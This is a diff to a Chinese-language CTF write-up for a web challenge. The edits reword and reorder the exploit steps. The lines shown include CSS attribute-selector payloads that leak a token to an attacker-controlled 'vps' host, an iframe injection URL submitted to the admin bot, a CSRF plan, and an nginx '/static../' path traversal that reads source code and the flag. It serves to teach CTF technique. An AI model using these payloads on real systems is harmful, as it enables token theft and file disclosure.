@@ -52,7 +52,7 @@ a[href^=flag\?token\=11]{background: url(//vps/rpo/?c=11);}
 ```
 
 在 VPS 上写入如下功能的 PoC：
-1. 生成 CSRF 修改 admin 的 url 为 css payload 的表单
+1. 生成利用 CSRF 修改 admin 的 url 为 css payload 的表单
 2. 提交表单到 `/urlstorage/rpo`，触发 css payload
 3. 循环获取 32 位 token
 
@@ -70,8 +70,6 @@ a[href^=flag\?token\=11]{background: url(//vps/rpo/?c=11);}
 
 #flag[value^=\33\34\43\33]{background: url(http://vps/?flag34c3);}
 ```
-
-contact 页面提交 url  `http://127.0.0.1/flag?token=</title><iframe/src=vps/exploit.php?step=1>`
 
 虽然这里 `XSS-Protection=1`，但 admin 是运行在 phantomjs 上，因此应该不会有 XSS Auditor
 
@@ -95,6 +93,8 @@ payload
 
 官方 [PoC](exploit.php)
 
+然后在 contact 页面提交 url  `http://127.0.0.1/flag?token=</title><iframe/src=vps/exploit.php`，一段时间后访问 `http://vps/exploit.php?flag2` 获得 flag
+
 ## 非预期
 题目用了 nginx 做反向代理，其中静态文件目录配置如下
 
@@ -104,7 +104,7 @@ payload
  }
 ```
 
-存在目录穿越漏洞（漏洞详情戳 [三个案例看 Nginx 配置安全](https://paper.seebug.org/335/#_1))
+存在目录穿越漏洞（漏洞详情戳 [三个案例看 Nginx 配置安全](https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html))
 
 访问 `http://127.0.0.1:8012/static../views.py` 获得源码，直接 `/static../templates/flag.html` 获得 flag
 
